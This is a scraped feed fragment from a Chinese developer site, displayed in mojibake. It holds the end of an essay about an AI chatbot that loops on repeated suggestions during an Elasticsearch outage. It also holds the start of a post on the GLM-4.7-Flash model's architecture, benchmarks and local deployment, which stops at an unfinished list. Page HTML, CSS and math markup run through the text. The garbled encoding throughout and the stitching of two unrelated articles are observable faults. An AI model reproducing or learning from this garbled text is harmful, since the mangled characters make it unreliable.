<h2 data-id="heading-4">æœ‰æ—¶å€™ï¼Œå®ƒä¹ŸæŒºæ°”äººçš„</h2>
<p>è¿™ä»¶äº‹å‘ç”Ÿåœ¨ä¸Šä¸ªæœˆï¼Œè®©æˆ‘å½»åº•æ˜ç™½äº†AIçš„å±€é™æ€§ã€‚</p>
<p>é‚£å¤©æ™šä¸Šåä¸€ç‚¹ï¼Œçº¿ä¸Šçªç„¶æŠ¥äº†ä¸ªç´§æ€¥bugâ€”â€”æœç´¢åŠŸèƒ½æŒ‚äº†ã€‚æˆ‘ä¸€è¾¹é‡å¯æœåŠ¡ï¼Œä¸€è¾¹æŠŠæŠ¥é”™æ—¥å¿—æ‰”ç»™<strong>DeepSeek</strong>ï¼šâ€œElasticsearché›†ç¾¤è¿æ¥å¤±è´¥ï¼Œå¸®å¿™çœ‹çœ‹æ€ä¹ˆå›äº‹ã€‚â€</p>
<p>å®ƒå¾ˆå¿«å›å¤ï¼šâ€œæ£€æŸ¥ç½‘ç»œè¿æ¥ï¼Œç¡®è®¤é›†ç¾¤èŠ‚ç‚¹æ˜¯å¦å­˜æ´»ã€‚â€ æˆ‘æ£€æŸ¥äº†ï¼Œç½‘ç»œé€šçš„ï¼ŒèŠ‚ç‚¹éƒ½åœ¨ã€‚</p>
<p>â€œé›†ç¾¤çŠ¶æ€æ˜¯yellowï¼Œæœ‰æœªåˆ†é…çš„åˆ†ç‰‡ã€‚â€å®ƒåˆç»™å‡ºäº†ç¬¬äºŒä¸ªå»ºè®®ã€‚</p>
<p>æˆ‘æŒ‰ç…§å®ƒçš„æŒ‡ç¤ºï¼Œé‡æ–°åˆ†é…äº†åˆ†ç‰‡ï¼Œå¯é—®é¢˜ä¾æ—§ã€‚è¿™æ—¶å€™å®ƒå¼€å§‹è¿›å…¥ä¸€ç§å¥‡æ€ªçš„å¾ªç¯ï¼š</p>
<p>â€œå°è¯•é‡å¯ElasticsearchæœåŠ¡ã€‚â€ æˆ‘é‡å¯äº†ï¼Œæ²¡ç”¨ã€‚</p>
<p>â€œæ£€æŸ¥é…ç½®æ–‡ä»¶ï¼Œç¡®è®¤é›†ç¾¤åç§°æ˜¯å¦ä¸€è‡´ã€‚â€ æ£€æŸ¥äº†ï¼Œä¸€è‡´ã€‚</p>
<p>â€œæ¸…ç†ç´¢å¼•ç¼“å­˜ï¼Œé‡æ–°å»ºç«‹ç´¢å¼•ã€‚â€ åšäº†ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚</p>
<p>æœ€è¯¡å¼‚çš„äº‹æƒ…å‘ç”Ÿäº†ï¼šå®ƒå¼€å§‹é‡å¤ä¹‹å‰çš„å»ºè®®ï¼Œå°±åƒè¢«å›°åœ¨äº†è‡ªå·±çš„é€»è¾‘é‡Œã€‚â€œæ£€æŸ¥ç½‘ç»œè¿æ¥â€â€œé‡å¯æœåŠ¡â€â€œæ£€æŸ¥é…ç½®â€â€¦â€¦è¿™ä¸‰æ¡å»ºè®®å¼€å§‹å¾ªç¯å‡ºç°ï¼Œé—´éš”æ—¶é—´éƒ½å·®ä¸å¤šã€‚</p>
<p>æˆ‘ç›¯ç€å±å¹•ï¼Œçªç„¶æœ‰ç§è’è¯çš„æ„Ÿè§‰â€”â€”æˆ‘åœ¨å’Œä¸€ä¸ªé™·å…¥æ­»å¾ªç¯çš„AIå¯¹è¯ï¼Œè€Œçº¿ä¸ŠæœåŠ¡è¿˜ç˜«ç€ã€‚</p>
<p>â€œä½ åˆšæ‰å·²ç»è¯´è¿‡è¿™äº›äº†ï¼Œâ€æˆ‘å¿ä¸ä½æ‰“å­—ï¼Œâ€œè¿˜æœ‰æ²¡æœ‰åˆ«çš„æ€è·¯ï¼Ÿâ€</p>
<p>å®ƒåœé¡¿äº†å‡ ç§’ï¼ˆæˆ–è€…è¯´ï¼Œå‡è£…åœé¡¿äº†å‡ ç§’ï¼‰ï¼Œç„¶åè¯´ï¼šâ€œæŸ¥çœ‹Elasticsearchæ—¥å¿—ï¼Œå¯»æ‰¾æ›´å…·ä½“çš„é”™è¯¯ä¿¡æ¯ã€‚â€</p>
<p>è¿™ä¸ªå»ºè®®å®ƒåäº”åˆ†é’Ÿå‰å°±ç»™è¿‡äº†ã€‚æˆ‘å¹äº†å£æ°”ï¼ŒçŸ¥é“ä»Šæ™šä¸èƒ½æŒ‡æœ›å®ƒäº†ã€‚</p>
<p>æœ€åæˆ‘æƒ³äº†æƒ³ï¼Œå¥½åƒæ˜¯å› ä¸ºæœ€è¿‘åŠ äº†æ–°çš„ç´¢å¼•æ¨¡æ¿ï¼Ÿæˆ‘å»æŸ¥äº†æŸ¥ç´¢å¼•æ¨¡æ¿çš„é…ç½®ï¼Œæœç„¶æœ‰å­—æ®µç±»å‹å†²çªã€‚</p>
<p>ä¿®å¤åªèŠ±äº†äº”åˆ†é’Ÿã€‚å‡Œæ™¨ä¸€ç‚¹åŠï¼Œæœç´¢åŠŸèƒ½æ¢å¤æ­£å¸¸ã€‚</p>
<p>å…³ç”µè„‘å‰ï¼Œæˆ‘çœ‹ç€<strong>DeepSeek</strong>çš„å¯¹è¯æ¡†ï¼Œé‡Œé¢è¿˜èººç€å®ƒæœ€åä¸€æ¡å»ºè®®ï¼šâ€œå»ºè®®å‡çº§Elasticsearchåˆ°æœ€æ–°ç‰ˆæœ¬ä»¥è·å¾—æ›´å¥½çš„ç¨³å®šæ€§ã€‚â€</p>
<p>æˆ‘è‹¦ç¬‘ç€æ‘‡æ‘‡å¤´ã€‚é‚£ä¸€åˆ»æˆ‘çªç„¶æ˜ç™½ï¼ŒAIå°±åƒä¸ªè®°å¿†åŠ›è¶…ç¾¤ã€ä½†ç»éªŒä¸è¶³çš„æ–°äººåŒäº‹ã€‚å®ƒèƒ½å¿«é€Ÿç»™å‡ºæ ‡å‡†ç­”æ¡ˆï¼Œä½†å½“é—®é¢˜è¶…å‡ºå®ƒçš„çŸ¥è¯†å›¾è°±æ—¶ï¼Œå®ƒå°±ä¼šå¼€å§‹åŸåœ°æ‰“è½¬ã€‚</p>
<p>ç°åœ¨é‡åˆ°é—®é¢˜ï¼Œæˆ‘é¦–å…ˆè¿˜æ˜¯ä¼šå…ˆé—®<strong>DeepSeek</strong>ã€‚ä½†å¦‚æœå®ƒå¼€å§‹é‡å¤è‡ªå·±ï¼Œæˆ‘å°±çŸ¥é“ï¼šè¯¥è‡ªå·±åŠ¨è„‘å­äº†ã€‚</p>
<p>è¿™ä»¶äº‹è®©æˆ‘å¯¹AIçš„æ€åº¦å˜å¾—æ›´å¥åº·â€”â€”å®ƒæ˜¯ä¸ªå¥½å·¥å…·ï¼Œä½†ä¸æ˜¯ä¸‡èƒ½è¯ã€‚æœ‰æ—¶å€™å®ƒçš„â€œç¬¨â€ï¼Œåè€Œæé†’äº†æˆ‘ï¼šé‚£äº›éœ€è¦è·³è·ƒæ€ç»´ã€éœ€è¦ç»éªŒç›´è§‰ã€éœ€è¦çªç ´å¸¸è§„çš„åœ°æ–¹ï¼Œä¾ç„¶æ˜¯äººç±»ä¸å¯æ›¿ä»£çš„ä»·å€¼ã€‚</p>
<h2 data-id="heading-5">å›å¤´çœ‹çœ‹ï¼Œå¥½åƒå“ªé‡Œä¸ä¸€æ ·äº†</h2>
<p>åˆšåˆšè¿‡å»çš„åŠå°æ—¶ï¼Œæˆ‘ç”¨AIè§„åˆ’äº†ä¸‹ä¸ªæœˆçš„å‘¨æœ«æ¸¸ç©è®¡åˆ’ï¼ŒæŸ¥äº†å‡ ä¸ªä¸æ‡‚çš„æ–™ç†æœ¯è¯­ï¼Œç”šè‡³è¿˜è®©å®ƒç”Ÿæˆäº†ä¸€æ®µç™½å™ªéŸ³ï¼Œå¸®åŠ©æˆ‘é›†ä¸­æ³¨æ„åŠ›å†™è¿™ç¯‡æ–‡ç« ã€‚</p>
<p>å®ƒä¸å†åªæ˜¯é‚£ä¸ªå¸®æˆ‘å†™ä»£ç çš„å·¥å…·äº†ã€‚å®ƒå˜æˆäº†ä¸€ç§å¾ˆè‡ªç„¶çš„ä¹ æƒ¯â€”â€”åƒéœ€è¦æŸ¥èµ„æ–™æ—¶æ‰“å¼€æµè§ˆå™¨é‚£ä¹ˆè‡ªç„¶ã€‚</p>
<p>æŠ€æœ¯æœ€æ¸©æŸ”çš„æ ·å­ï¼Œæˆ–è®¸ä¸æ˜¯å®ƒæ”¹å˜äº†ä¸–ç•Œï¼Œè€Œæ˜¯å®ƒå°±è¿™æ ·æ‚„æ— å£°æ¯åœ°ï¼Œåœ¨æ™®é€šäººçš„æ™®é€šç”Ÿæ´»é‡Œï¼Œæ‰¾åˆ°äº†è‡ªå·±çš„ä½ç½®ã€‚</p>
<p>è€Œæˆ‘ï¼Œä¹Ÿä¹ æƒ¯äº†åœ¨é‡åˆ°å„ç§å°é—®é¢˜æ—¶ï¼Œè‡ªç„¶åœ°æƒ³ï¼šâ€œè¦ä¸ï¼Œé—®é—®AIï¼Ÿâ€</p>
<p>å®ƒä¸ä¸€å®šéƒ½å¯¹ï¼Œä¸ä¸€å®šéƒ½æ‡‚ã€‚ä½†æœ‰ä¸ªéšæ—¶èƒ½é—®ã€æ°¸è¿œè€å¿ƒã€å¶å°”è¿˜èƒ½ç»™å‡ºæƒŠå–œå»ºè®®çš„â€œä¼™ä¼´â€ï¼Œè¿™ä»¶äº‹æœ¬èº«ï¼Œå°±è®©2025å¹´çš„æ—¥å¸¸ï¼Œå¤šäº†ç‚¹ä¸ä¸€æ ·çš„æ»‹å‘³â€”â€”</p>
<p>æˆ–è®¸æœªæ¥å¾ˆé•¿ä¸€æ®µæ—¶é—´éƒ½ä¼šè¿™æ ·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ™ºè°±GLM-4.7-Flashå®æµ‹ï¼š3Bçš„æ¿€æ´»é‡è·‘å‡º30Bçš„æ€§èƒ½ï¼Œæœ¬åœ°éƒ¨ç½²å˜å¤©äº†]]></title>    <link>https://juejin.cn/post/7597252004713889834</link>    <guid>https://juejin.cn/post/7597252004713889834</guid>    <pubDate>2026-01-20T13:51:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597252004713889834" data-draft-id="7597250364125462591" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ™ºè°±GLM-4.7-Flashå®æµ‹ï¼š3Bçš„æ¿€æ´»é‡è·‘å‡º30Bçš„æ€§èƒ½ï¼Œæœ¬åœ°éƒ¨ç½²å˜å¤©äº†"/> <meta itemprop="keywords" content="AIGC"/> <meta itemprop="datePublished" content="2026-01-20T13:51:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¢¨é£å¦‚é›ª"/> <meta itemprop="url" content="https://juejin.cn/user/4064249017803927"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ™ºè°±GLM-4.7-Flashå®æµ‹ï¼š3Bçš„æ¿€æ´»é‡è·‘å‡º30Bçš„æ€§èƒ½ï¼Œæœ¬åœ°éƒ¨ç½²å˜å¤©äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4064249017803927/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¢¨é£å¦‚é›ª
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T13:51:43.000Z" title="Tue Jan 20 2026 13:51:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å°±åœ¨2026å¹´1æœˆ20æ—¥ï¼Œæ™ºè°±AIä¸ä»…ç”©å‡ºäº†æœ€æ–°çš„GLM-4.7-Flashï¼Œè¿˜é¡ºæ‰‹æŠŠâ€œè½»é‡çº§æ¨¡å‹â€çš„å¤©èŠ±æ¿ç»™æ€äº†ã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªé•¿æœŸåœ¨å¼€æºç¤¾åŒºæ‘¸çˆ¬æ»šæ‰“ï¼Œä¹ æƒ¯äº†åœ¨æ˜¾å­˜ç„¦è™‘å’Œæ€§èƒ½å¦¥åä¹‹é—´åå¤æ¨ªè·³çš„åšä¸»ï¼Œçœ‹åˆ°è¿™ä¸ªå‚æ•°é…ç½®æ—¶ï¼Œæˆ‘ç¡®å®æ„£äº†ä¸€ä¸‹ã€‚</p>
<p>å®˜æ–¹è¿™æ¬¡æ‰“å‡ºçš„ç‰Œå¾ˆæ¸…æ™°ï¼š<strong>300äº¿ï¼ˆ30Bï¼‰çš„æ€»å‚æ•°é‡ï¼Œä½†æ¨ç†æ—¶åªæ¿€æ´»30äº¿ï¼ˆ3Bï¼‰ã€‚</strong></p>
<p>è¿™å¥è¯èƒŒåçš„å«é‡‘é‡ï¼Œå¯èƒ½æ¯”é‚£ä¸€é•¿ä¸²çš„è·‘åˆ†æ•°æ®æ›´å€¼å¾—å„ä½å¼€å‘è€…å’Œæœ¬åœ°éƒ¨ç½²çˆ±å¥½è€…å…³æ³¨ã€‚ä»Šå¤©æˆ‘ä»¬å°±æŠ›å¼€é‚£äº›æ™¦æ¶©çš„è®ºæ–‡è¯æ±‡ï¼ŒèŠèŠè¿™ä¸ªæ¨¡å‹åˆ°åº•æ„å‘³ç€ä»€ä¹ˆï¼Œä»¥åŠå®ƒä¸ºä»€ä¹ˆå¯èƒ½æ˜¯ä½ æœ¬åœ°ç¡¬ç›˜é‡Œä¸‹ä¸€ä¸ªå¸¸é©»å˜‰å®¾ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.42.21-1024x508.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.42.21-1024x508.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d9abcaf84f7b43ae889d55f515686883~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=ChKupWy8LNBezceOPTQW0YAQrL8%3D" alt="iShot_2026-01-20_21.42.21" loading="lazy"/></a></p>
<h2 data-id="heading-0">å¤§è„‘å¾ˆå¤§ï¼Œä½†åªåŠ¨å…³é”®ç¥ç»</h2>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼ŒMoEï¼ˆæ··åˆä¸“å®¶ï¼‰æ¶æ„ä¸æ˜¯æ–°é²œäº‹ï¼Œä½†æŠŠæ¯”ä¾‹åšåˆ°è¿™ä¸ªç¨‹åº¦çš„ç¡®å®ç½•è§ã€‚</p>
<p>ä½ å¯ä»¥æŠŠGLM-4.7-Flashæƒ³è±¡æˆä¸€ä¸ªæ‹¥æœ‰300äº¿ç¥ç»å…ƒçš„å¤§è„‘ã€‚åœ¨ä»¥å‰ï¼Œä¸ç®¡ä½ æ˜¯é—®å®ƒâ€œ1+1ç­‰äºå‡ â€è¿˜æ˜¯è®©å®ƒâ€œé‡æ„æ•´ä¸ªåç«¯ä»£ç â€ï¼Œä¼ ç»Ÿçš„å¯†é›†æ¨¡å‹éƒ½è¦æŠŠæ‰€æœ‰ç¥ç»å…ƒè¿‡ä¸€éï¼Œè¿™å°±å¥½æ¯”æ€é¸¡ç”¨äº†ç‰›åˆ€ï¼Œè´¹ç”µåˆè´¹å¡ã€‚</p>
<p>è€ŒGLM-4.7-Flashçš„åšæ³•æ˜¯ï¼Œè™½ç„¶å®ƒå‚¨å¤‡äº†30Bçš„çŸ¥è¯†é‡ï¼ˆä¸“å®¶ï¼‰ï¼Œä½†æ¯æ¬¡å¤„ç†ä½ çš„è¯·æ±‚æ—¶ï¼Œå®ƒåªå”¤é†’å…¶ä¸­æœ€æ‡‚è¡Œçš„é‚£10%ï¼ˆçº¦3Bå‚æ•°ï¼‰ã€‚</p>
<p>è¿™å¯¹æˆ‘ä»¬æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p>æ„å‘³ç€ä½ æ‹¥æœ‰äº†30Bçº§åˆ«çš„æ™ºå•†å’ŒçŸ¥è¯†å‚¨å¤‡ï¼Œä½†ä½ çš„æ˜¾å¡åªéœ€è¦æ‰¿æ‹…è¿è¡Œ3Bæ¨¡å‹çš„ç®—åŠ›å¼€é”€ã€‚åœ¨å®é™…æµ‹è¯•ä¸­ï¼Œç”šè‡³åœ¨è‹¹æœM5èŠ¯ç‰‡çš„ç¬”è®°æœ¬ä¸Šï¼Œå®ƒèƒ½è·‘å‡ºæ¯ç§’43ä¸ªtokençš„é€Ÿåº¦ã€‚å¯¹äºæƒ³è¦åœ¨æœ¬åœ°è·‘å¤§æ¨¡å‹ï¼Œæ‰‹é‡Œå´åªæœ‰ä¸€å¼ RTX 4090ç”šè‡³æ›´ä½é…ç½®æ˜¾å¡çš„å…„å¼Ÿä»¬æ¥è¯´ï¼Œè¿™ç®€ç›´å°±æ˜¯ç¦éŸ³ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2Fasfdasdfdsa-881x1024.webp" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/asfdasdfdsa-881x1024.webp" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1471d050d1814841b9dd9e85767646f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=UmNAJ8wM4nHLziq6D4wYAbZESzY%3D" alt="asfdasdfdsa" loading="lazy"/></a></p>
<h2 data-id="heading-1">ä¸æ­¢æ˜¯å¿«ï¼Œæ›´æ˜¯â€œç å†œâ€åˆ©å™¨</h2>
<p>è¿™æ¬¡æ›´æ–°æœ€è®©æˆ‘æ„Ÿå…´è¶£çš„ï¼Œå…¶å®æ˜¯å®ƒåœ¨**Agentic Codingï¼ˆæ™ºèƒ½ä½“ç¼–ç ï¼‰**ä¸Šçš„ç‰¹åŒ–ã€‚</p>
<p>å¤§å®¶ä»¥å‰ç”¨å°æ¨¡å‹å†™ä»£ç ï¼Œæœ€å¤´ç–¼çš„æ˜¯ä»€ä¹ˆï¼Ÿæ˜¯å®ƒå¬ä¸æ‡‚äººè¯ï¼Œæˆ–è€…å†™å‡ºæ¥çš„ä»£ç é€»è¾‘è·‘ä¸é€šã€‚ç¨å¾®å¤æ‚ä¸€ç‚¹çš„éœ€æ±‚ï¼Œæ¯”å¦‚â€œå¸®æˆ‘å†™ä¸ªçˆ¬è™«å¹¶æŠŠæ•°æ®å­˜å…¥æ•°æ®åº“â€ï¼Œå°æ¨¡å‹å¾€å¾€é¡¾å¤´ä¸é¡¾è…šã€‚</p>
<p>GLM-4.7-Flashå¼•å…¥äº†ç±»ä¼¼O1ç³»åˆ—çš„â€œæ··åˆæ€è€ƒâ€æœºåˆ¶ã€‚ç®€å•è¯´ï¼Œå°±æ˜¯å®ƒåœ¨åŠ¨æ‰‹å†™ä»£ç ä¹‹å‰ï¼Œä¼šå…ˆåœ¨å†…éƒ¨â€œç¢ç£¨â€ä¸€ä¸‹ï¼šæ‹†è§£éœ€æ±‚ã€è§„åˆ’æ­¥éª¤ã€é€‰æ‹©å·¥å…·ã€‚</p>
<p>çœ‹ä¸€çœ¼åŸºå‡†æ•°æ®ï¼šåœ¨è€ƒæ ¸çœŸå®GitHubé—®é¢˜ä¿®å¤èƒ½åŠ›çš„SWE-bench Verifiedæµ‹è¯•ä¸­ï¼Œå®ƒæ‹¿ä¸‹äº†59.2çš„åˆ†æ•°ï¼›åœ¨è€ƒå¯Ÿå·¥å…·è°ƒç”¨çš„<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mspace linebreak="newline"/><mi>t</mi><mi>a</mi><msup><mi>u</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">\\tau^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="mspace newline"/><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord mathnormal">t</span><span class="mord mathnormal">a</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span>-Benchä¸Šæ›´æ˜¯è¾¾åˆ°äº†87.4åˆ†ã€‚è¿™ä¸ä»…ä»…æ˜¯åˆ†æ•°çš„æå‡ï¼Œè€Œæ˜¯æ„å‘³ç€å®ƒå¼€å§‹å…·å¤‡äº†çœŸæ­£çš„â€œå¹²æ´»â€èƒ½åŠ›ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªä»£ç è¡¥å…¨å·¥å…·ã€‚</p>
<p>æ™ºè°±è¿™æ¬¡è¿˜åœ¨æ¶æ„ä¸­å¡è¿›äº†MLAæ³¨æ„åŠ›æœºåˆ¶ï¼Œé…åˆ200Kçš„è¶…é•¿ä¸Šä¸‹æ–‡çª—å£ã€‚è¿™ä¸ä»…æ˜¯ä¸ºäº†è®©ä½ æ‰”è¿›å»å‡ æœ¬ä¹¦åšæ€»ç»“ï¼Œæ›´æ˜¯ä¸ºäº†è®©æ¨¡å‹åœ¨å¤„ç†å¤§å‹ä»£ç åº“æ—¶ï¼Œä¸ä¼šè¯»äº†åé¢å¿˜äº†å‰é¢ã€‚</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.worldcodeing.com%2Fwp-content%2Fuploads%2F2026%2F01%2FiShot_2026-01-20_21.41.40-1024x344.png" target="_blank" title="https://blog.worldcodeing.com/wp-content/uploads/2026/01/iShot_2026-01-20_21.41.40-1024x344.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5c526f189ab543f49a4e7eff49fcf11b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo6aOO5aaC6Zuq:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769521902&amp;x-signature=OHYcH35P6rPKcgHIfiBYskt67c4%3D" alt="iShot_2026-01-20_21.41.40" loading="lazy"/></a></p>
<h2 data-id="heading-2">æœ¬åœ°å…šå’ŒAPIå…šçš„åŒé‡ç‹‚æ¬¢</h2>
<p>å¯¹äºè¿˜åœ¨ç”¨GLM-4.5-Flashçš„æœ‹å‹ï¼Œè¿™é‡Œæœ‰ä¸ªæé†’ï¼šè€ç‰ˆæœ¬å°†åœ¨1æœˆåº•ä¸‹çº¿ï¼Œæµé‡ä¼šè‡ªåŠ¨åˆ‡åˆ°4.7ã€‚è¿™æ³¢å‡çº§æ˜¯æ— ç¼ä¸”å…è´¹çš„ã€‚</p>
<p>è€Œå¯¹äºæƒ³ç©ç§æœ‰åŒ–çš„æœ‹å‹ï¼Œè¿™æ¬¡å¼€æºéå¸¸å½»åº•ã€‚</p>
<p>å¦‚æœä½ æƒ³åœ¨æœ¬åœ°éƒ¨ç½²ï¼Œé—¨æ§›çœŸçš„ä¸é«˜ï¼š</p>
<ul>
